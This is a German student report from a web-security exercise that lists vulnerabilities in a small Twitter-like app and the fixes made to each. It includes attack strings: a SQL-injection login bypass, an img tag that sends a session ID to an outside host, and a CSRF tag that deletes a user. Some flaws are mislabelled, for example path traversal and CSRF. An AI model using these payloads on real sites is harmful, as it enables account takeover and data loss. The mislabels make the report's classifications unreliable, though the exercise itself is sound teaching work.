Gefundene Lücken:

Nummer 1:
=========

- Kurzbeschreibung der Lücke:
    Username und Passwort unsicher durch Sql abfrage:
    man kann ' OR '1 eintippen und erhällt einen Gültigen user
- Typ der Sicherheitslücke gem. Vorlesung:
    SQL Injection
- Maßnahmen zu Behebung:
    SQLite interne Funktionen verwenden
- geänderte Dateien:
    usermodel.py Sqlite statement verwendet anstatt der Formats.
    minitwitter.py weil mich das server abschmieren beim falschen eingeben aufgeregt hat
    Es wurde kein user mitgeliefert

Nummer 2:
=========

- Kurzbeschreibung der Lücke:
    Html code oder Java Script code im Tweet ausführen
- Typ der Sicherheitslücke gem. Vorlesung:
    XSS Lücke
- Maßnahmen zu Behebung:
    Behebung durch überprüfung der Variablen auf Code
- geänderte Dateien:
    minitwitter.py < durch &lt ersetzen mit .replace("<", "&lt") beim Tweet

Nummer 3:
=========

- Kurzbeschreibung der Lücke:
    durch einschleusen von Java Script code im Tweet Fenster
    Session ID an einen anderen Computer senden per <img src='myserver.com/img/$SessionId'>
- Typ der Sicherheitslücke gem. Vorlesung:
    CSRF Lücke
- Maßnahmen zu Behebung:
    Tweet auf Code überprüfen
- geänderte Dateien:
    wurde oben mit behoben sind aber zwei verschiedene Lücken


Nummer 4:
=========

- Kurzbeschreibung der Lücke:
    Session eines anderen Nutzers übernehmen durch mitlesen von Cookies.
    Obere Lücke Nutzen zum auslesen und senden eines cookies per route.
- Typ der Sicherheitslücke gem. Vorlesung:
    Session Hijacking
- Maßnahmen zu Behebung:
    Cookie HTTP only machen.
- geänderte Dateien:
    session.py httpOnly flag bei Cookie einstellen

Nummer 5:
=========

- Kurzbeschreibung der Lücke:
    Nach dem ein Tweet erstellt wurde erscheint eine Nachricht oben auf der Html Seite.
    Diese kann beliebig durch die URl geändert werden.
- Typ der Sicherheitslücke gem. Vorlesung:
    Path Traversal
- Maßnahmen zu Behebung:
    Speichern der Variablen intern Handlen anstatt von extern
- geänderte Dateien:
    minitwitter.py request params durch templates ersetzt so kann nicht von aussen darauf Zugegriffen werden
    und usermanagement.py genauso wie oben

Weiterer CSRF angriff möglich durch <img src"localhost:8080/useradmin/delete/user1>" wenn der Admin den Tweet liest
löscht er automatisch einen Nutzer.


NebenInfos:
    user' OR '1'='1 // SQL Injections im Login Fenster bei Benutzer und Passwort
    Xss bei Tweet // HTML Code wird ausgeführt
    Path Traversial in der URL // Message kann beliebig geändert werden
    Session Hijacking:
        offene Session in jeder Nachricht -> bekannt durch wireshark
        Beispiel mitlesen von Admin Session -> Cookie update auf admin Session -> Voller Zugriff auf Admin rechte
    Idee:
        durch Tweets bei anderen Clients Befehle ausführen Cross-Site-Request-Forgery
